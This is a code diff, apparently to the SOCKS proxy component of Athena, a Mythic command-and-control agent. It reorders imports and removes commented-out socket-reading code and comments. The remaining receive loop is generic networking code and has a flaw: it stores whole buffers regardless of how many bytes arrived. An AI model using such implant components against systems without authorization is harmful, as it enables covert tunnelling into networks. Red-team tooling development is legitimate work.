@@ -1,12 +1,11 @@
-﻿using System;
+﻿using Athena.Models.Mythic.Response;
+using Athena.Utilities;
+using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
-using Athena.Models.Mythic.Response;
-using Athena.Utilities;
 
 namespace Athena.Models.Athena.Socks
 {
@@ -382,33 +381,6 @@ namespace Athena.Models.Athena.Socks
                 }
             }
         }
-        //public List<byte[]> receiveMessages(){
-        //    try
-        //    {
-        //        using (NetworkStream stream = this.socket.GetStream())
-        //        {
-        //            byte[] data = new byte[1024];
-        //            using (MemoryStream ms = new MemoryStream())
-        //            {
-
-        //                int numBytesRead;
-        //                while ((numBytesRead = stream.Read(data, 0, data.Length)) > 0)
-        //                {
-        //                    ms.Write(data, 0, numBytesRead);
-        //                }
-
-        //                return new List<byte[]> { ms.ToArray() };
-        //            }
-        //        }
-        //    }
-        //    catch (Exception e)
-        //    {
-        //        Misc.WriteDebug(e.Message);
-        //        return new List<byte[]>();
-        //    }
-        //}
-
-
 
         public List<byte[]> receiveMessages()
         {
@@ -416,9 +388,6 @@ namespace Athena.Models.Athena.Socks
             byte[] bytes;
             int bytesRec;
 
-            //If you are using a non-blocking Socket, Available is a good way to determine whether data is queued for reading, before calling Receive.
-            //The available data is the total amount of data queued in the network buffer for reading. If no data is queued in the network buffer, Available returns 0.
-            //https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.available?view=net-5.0
             while (this.socket.Available != 0)
             {
                 //Let's allocate our bytes, either in 512k chunks or less.
@@ -430,24 +399,11 @@ namespace Athena.Models.Athena.Socks
                 {
                     bytes = new byte[512000];
                 }
-                //Receive our allocation.
-
-
 
                 bytesRec = this.socket.Receive(bytes);
                 lstOut.Add(bytes);
             }
             return lstOut;
-
-            //https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/agent_code/socks/socks.go#L314
-            //Should I be doing this?
-            //smOut = new SocksMessage()
-            //{
-            //    server_id = conn.server_id,
-            //    data = Misc.Base64Encode(new byte[] { }),
-            //    exit = true
-            //};
-            //this.messagesOut.Enqueue(smOut);
         }
     }
 }
